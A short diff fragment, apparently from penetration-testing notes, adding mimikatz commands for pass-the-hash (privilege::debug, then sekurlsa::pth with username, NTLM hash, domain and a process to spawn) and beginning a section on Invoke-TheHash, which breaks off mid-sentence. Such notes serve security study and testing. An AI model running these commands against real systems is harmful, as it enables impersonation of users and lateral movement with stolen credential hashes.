@@ -5,5 +5,9 @@ We can use mimikatz to spawn process in other user's context if we obtained thei
 ```
 mimikatz.exe
 privilege::debug
-
+sekurlsa::pth /user:<username> /<rc4/ntlm>:<hash> /domain:<domain_name> /run:<process to spawn>
+exit
 ```
+
+-Passing the hash with PowerShell Invoke-TheHash:
+We can 
